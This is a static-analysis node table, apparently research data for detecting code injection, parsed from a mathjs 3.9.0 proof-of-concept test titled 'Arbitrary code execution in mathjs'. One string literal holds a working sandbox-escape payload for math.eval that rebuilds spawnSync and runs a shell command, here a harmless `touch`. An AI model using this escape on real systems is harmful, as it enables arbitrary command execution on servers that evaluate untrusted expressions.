Id:ID¿Type¿SubType¿FunctionContext¿IdentifierName¿Raw¿InternalStructure¿Location¿Code¿Label:LABEL
170¿Identifier¿¿241¿fs¿¿¿{"start":{"line":7,"column":15},"end":{"line":7,"column":17},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
171¿Identifier¿¿241¿existsSync¿¿¿{"start":{"line":7,"column":18},"end":{"line":7,"column":28},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
172¿Identifier¿¿241¿path¿¿¿{"start":{"line":7,"column":29},"end":{"line":7,"column":33},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
173¿VariableDeclarator¿¿241¿v12¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿VariableDeclarator
174¿CallExpression¿¿241¿¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿CallExpression
175¿Identifier¿¿241¿expect¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":8},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
176¿Identifier¿¿241¿file_exist¿¿¿{"start":{"line":8,"column":9},"end":{"line":8,"column":19},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
177¿VariableDeclarator¿¿241¿v13¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":32},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿VariableDeclarator
178¿CallExpression¿¿241¿¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":32},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿CallExpression
179¿MemberExpression¿¿241¿¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿MemberExpression
180¿Identifier¿¿241¿v12¿¿¿¿¿Identifier
181¿Identifier¿¿241¿toBe¿¿¿{"start":{"line":8,"column":21},"end":{"line":8,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
182¿Literal¿boolean¿241¿¿false¿¿{"start":{"line":8,"column":26},"end":{"line":8,"column":31},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Literal
183¿ExpressionStatement¿¿241¿¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":33},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿ExpressionStatement
184¿Identifier¿¿241¿v13¿¿¿¿¿Identifier
185¿TryStatement¿¿241¿¿¿¿{"start":{"line":9,"column":2},"end":{"line":13,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿TryStatement
186¿VariableDeclarator¿¿241¿v14¿¿¿{"start":{"line":10,"column":4},"end":{"line":12,"column":5},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿VariableDeclarator
187¿CallExpression¿¿241¿¿¿¿{"start":{"line":10,"column":4},"end":{"line":12,"column":5},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿CallExpression
188¿MemberExpression¿¿241¿¿¿¿{"start":{"line":10,"column":4},"end":{"line":10,"column":13},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿MemberExpression
189¿Identifier¿¿241¿math¿¿¿{"start":{"line":10,"column":4},"end":{"line":10,"column":8},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
190¿Identifier¿¿241¿eval¿¿¿{"start":{"line":10,"column":9},"end":{"line":10,"column":13},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
191¿Literal¿string¿241¿¿'[].map.constructor('spawn_sync = process.binding(`spawn_sync`); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};console.log(spawnSync(`touch`,[`mathjs`]));')()'¿¿{"start":{"line":11,"column":6},"end":{"line":11,"column":1417},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Literal
192¿ExpressionStatement¿¿241¿¿¿¿{"start":{"line":10,"column":4},"end":{"line":12,"column":6},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿ExpressionStatement
193¿Identifier¿¿241¿v14¿¿¿¿¿Identifier
194¿BlockStatement¿¿241¿¿¿¿{"start":{"line":9,"column":6},"end":{"line":13,"column":3},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿BlockStatement
195¿CatchClause¿¿241¿¿¿¿{"start":{"line":13,"column":4},"end":{"line":13,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿CatchClause
196¿BlockStatement¿¿241¿¿¿¿{"start":{"line":13,"column":18},"end":{"line":13,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿BlockStatement
197¿Identifier¿¿241¿error¿¿¿{"start":{"line":13,"column":11},"end":{"line":13,"column":16},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
198¿ExpressionStatement¿¿241¿¿¿¿{"start":{"line":14,"column":2},"end":{"line":14,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿ExpressionStatement
199¿AssignmentExpression¿=¿241¿¿¿¿{"start":{"line":14,"column":2},"end":{"line":14,"column":34},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿AssignmentExpression
200¿Identifier¿¿241¿file_exist¿¿¿{"start":{"line":14,"column":2},"end":{"line":14,"column":12},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
201¿CallExpression¿¿241¿¿¿¿{"start":{"line":14,"column":15},"end":{"line":14,"column":34},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿CallExpression
202¿MemberExpression¿¿241¿¿¿¿{"start":{"line":14,"column":15},"end":{"line":14,"column":28},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿MemberExpression
203¿Identifier¿¿241¿fs¿¿¿{"start":{"line":14,"column":15},"end":{"line":14,"column":17},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
204¿Identifier¿¿241¿existsSync¿¿¿{"start":{"line":14,"column":18},"end":{"line":14,"column":28},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
205¿Identifier¿¿241¿path¿¿¿{"start":{"line":14,"column":29},"end":{"line":14,"column":33},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
206¿VariableDeclarator¿¿241¿v15¿¿¿{"start":{"line":15,"column":2},"end":{"line":15,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿VariableDeclarator
207¿CallExpression¿¿241¿¿¿¿{"start":{"line":15,"column":2},"end":{"line":15,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿CallExpression
208¿Identifier¿¿241¿expect¿¿¿{"start":{"line":15,"column":2},"end":{"line":15,"column":8},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
209¿Identifier¿¿241¿file_exist¿¿¿{"start":{"line":15,"column":9},"end":{"line":15,"column":19},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
210¿VariableDeclarator¿¿241¿v16¿¿¿{"start":{"line":15,"column":2},"end":{"line":15,"column":31},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿VariableDeclarator
211¿CallExpression¿¿241¿¿¿¿{"start":{"line":15,"column":2},"end":{"line":15,"column":31},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿CallExpression
212¿MemberExpression¿¿241¿¿¿¿{"start":{"line":15,"column":2},"end":{"line":15,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿MemberExpression
213¿Identifier¿¿241¿v15¿¿¿¿¿Identifier
214¿Identifier¿¿241¿toBe¿¿¿{"start":{"line":15,"column":21},"end":{"line":15,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
215¿Literal¿boolean¿241¿¿true¿¿{"start":{"line":15,"column":26},"end":{"line":15,"column":30},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Literal
216¿ExpressionStatement¿¿241¿¿¿¿{"start":{"line":15,"column":2},"end":{"line":15,"column":32},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿ExpressionStatement
217¿Identifier¿¿241¿v16¿¿¿¿¿Identifier
218¿VariableDeclarator¿¿241¿v17¿¿¿{"start":{"line":16,"column":18},"end":{"line":16,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿VariableDeclarator
219¿FunctionExpression¿¿241¿anon¿¿¿{"start":{"line":16,"column":18},"end":{"line":16,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿FunctionExpression
220¿Identifier¿¿0¿err¿¿¿{"start":{"line":16,"column":28},"end":{"line":16,"column":31},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
221¿BlockStatement¿¿244¿¿¿¿{"start":{"line":16,"column":33},"end":{"line":16,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿BlockStatement
222¿VariableDeclarator¿¿241¿v18¿¿¿{"start":{"line":16,"column":2},"end":{"line":16,"column":36},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿VariableDeclarator
223¿CallExpression¿¿241¿¿¿¿{"start":{"line":16,"column":2},"end":{"line":16,"column":36},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿CallExpression
224¿MemberExpression¿¿241¿¿¿¿{"start":{"line":16,"column":2},"end":{"line":16,"column":11},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿MemberExpression
225¿Identifier¿¿241¿fs¿¿¿{"start":{"line":16,"column":2},"end":{"line":16,"column":4},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
226¿Identifier¿¿241¿unlink¿¿¿{"start":{"line":16,"column":5},"end":{"line":16,"column":11},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
227¿Identifier¿¿241¿path¿¿¿{"start":{"line":16,"column":12},"end":{"line":16,"column":16},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
228¿Identifier¿¿241¿v17¿¿¿¿¿Identifier
229¿ExpressionStatement¿¿241¿¿¿¿{"start":{"line":16,"column":2},"end":{"line":16,"column":37},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿ExpressionStatement
230¿Identifier¿¿241¿v18¿¿¿¿¿Identifier
231¿BlockStatement¿¿241¿¿¿¿{"start":{"line":1,"column":49},"end":{"line":17,"column":1},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿BlockStatement
232¿VariableDeclarator¿¿239¿v20¿¿¿{"start":{"line":1,"column":0},"end":{"line":17,"column":2},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿VariableDeclarator
233¿CallExpression¿¿239¿¿¿¿{"start":{"line":1,"column":0},"end":{"line":17,"column":2},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿CallExpression
234¿Identifier¿¿239¿test¿¿¿{"start":{"line":1,"column":0},"end":{"line":1,"column":4},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Identifier
235¿Literal¿string¿239¿¿'Arbitrary code execution in mathjs'¿¿{"start":{"line":1,"column":5},"end":{"line":1,"column":41},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿Literal
236¿Identifier¿¿239¿v19¿¿¿¿¿Identifier
237¿ExpressionStatement¿¿239¿¿¿¿{"start":{"line":1,"column":0},"end":{"line":17,"column":3},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/mathjs_3.9.0/mathjs.test.js"}¿¿ExpressionStatement
238¿Identifier¿¿239¿v20¿¿¿¿¿Identifier
239¿CFG_F_START¿¿239¿__main__¿¿¿¿¿CFG_F_START
240¿CFG_F_END¿¿0¿__main__¿¿¿¿¿CFG_F_END
241¿CFG_F_START¿¿241¿142_anon¿¿¿¿¿CFG_F_START
242¿CFG_F_END¿¿0¿142_anon¿¿¿¿¿CFG_F_END
243¿CFG_TRY_STMT_END¿¿0¿¿¿¿¿¿CFG_TRY_STMT_END
244¿CFG_F_START¿¿244¿219_anon¿¿¿¿¿CFG_F_START
245¿CFG_F_END¿¿0¿219_anon¿¿¿¿¿CFG_F_END
246¿TAINT_SOURCE¿¿0¿TAINT_SOURCE¿¿¿¿¿TAINT_SOURCE
247¿PDG_OBJECT¿¿0¿241.this-o31¿¿¿¿¿PDG_OBJECT
248¿PDG_OBJECT¿¿0¿239.v19-o32¿¿¿¿¿PDG_OBJECT
249¿PDG_CALL¿¿239¿239.CALL->test-o33¿¿¿¿¿PDG_CALL
250¿PDG_OBJECT¿¿0¿239.v20-o34¿¿¿¿¿PDG_OBJECT
251¿PDG_CALL¿¿241¿241.CALL->expect.assertions-o35¿¿¿¿¿PDG_CALL
252¿PDG_OBJECT¿¿0¿241.v11-o36¿¿¿¿¿PDG_OBJECT
253¿PDG_CALL¿¿241¿241.CALL->require-o37¿¿¿¿¿PDG_CALL
254¿PDG_OBJECT¿¿0¿241.fs-o38¿¿¿¿¿PDG_OBJECT
255¿TAINT_SINK¿¿0¿require¿¿¿¿¿TAINT_SINK
256¿PDG_CALL¿¿241¿241.CALL->require-o39¿¿¿¿¿PDG_CALL
257¿PDG_OBJECT¿¿0¿241.math-o40¿¿¿¿¿PDG_OBJECT
258¿TAINT_SINK¿¿0¿require¿¿¿¿¿TAINT_SINK
259¿PDG_OBJECT¿¿0¿241.data-o41¿¿¿¿¿PDG_OBJECT
260¿PDG_CALL¿¿241¿241.CALL->fs.existsSync-o42¿¿¿¿¿PDG_CALL
261¿PDG_OBJECT¿¿0¿241.file_exist-o43¿¿¿¿¿PDG_OBJECT
262¿PDG_CALL¿¿241¿241.CALL->expect-o44¿¿¿¿¿PDG_CALL
263¿PDG_OBJECT¿¿0¿241.v12-o45¿¿¿¿¿PDG_OBJECT
264¿PDG_CALL¿¿241¿241.CALL->v12.toBe-o46¿¿¿¿¿PDG_CALL
265¿PDG_OBJECT¿¿0¿241.v13-o47¿¿¿¿¿PDG_OBJECT
266¿PDG_CALL¿¿241¿241.CALL->math.eval-o48¿¿¿¿¿PDG_CALL
267¿PDG_OBJECT¿¿0¿241.v14-o49¿¿¿¿¿PDG_OBJECT
268¿TAINT_SINK¿¿0¿eval¿¿¿¿¿TAINT_SINK
269¿PDG_CALL¿¿241¿241.CALL->fs.existsSync-o50¿¿¿¿¿PDG_CALL
270¿PDG_OBJECT¿¿0¿241.file_exist-o51¿¿¿¿¿PDG_OBJECT
271¿PDG_CALL¿¿241¿241.CALL->expect-o52¿¿¿¿¿PDG_CALL
272¿PDG_OBJECT¿¿0¿241.v15-o53¿¿¿¿¿PDG_OBJECT
273¿PDG_CALL¿¿241¿241.CALL->v15.toBe-o54¿¿¿¿¿PDG_CALL
274¿PDG_OBJECT¿¿0¿241.v16-o55¿¿¿¿¿PDG_OBJECT
275¿PDG_OBJECT¿¿0¿244.this-o56¿¿¿¿¿PDG_OBJECT
276¿PDG_OBJECT¿¿0¿244.err-o57¿¿¿¿¿PDG_OBJECT
277¿PDG_OBJECT¿¿0¿241.v17-o58¿¿¿¿¿PDG_OBJECT
278¿PDG_CALL¿¿241¿241.CALL->fs.unlink-o59¿¿¿¿¿PDG_CALL
279¿PDG_OBJECT¿¿0¿241.v18-o60¿¿¿¿¿PDG_OBJECT
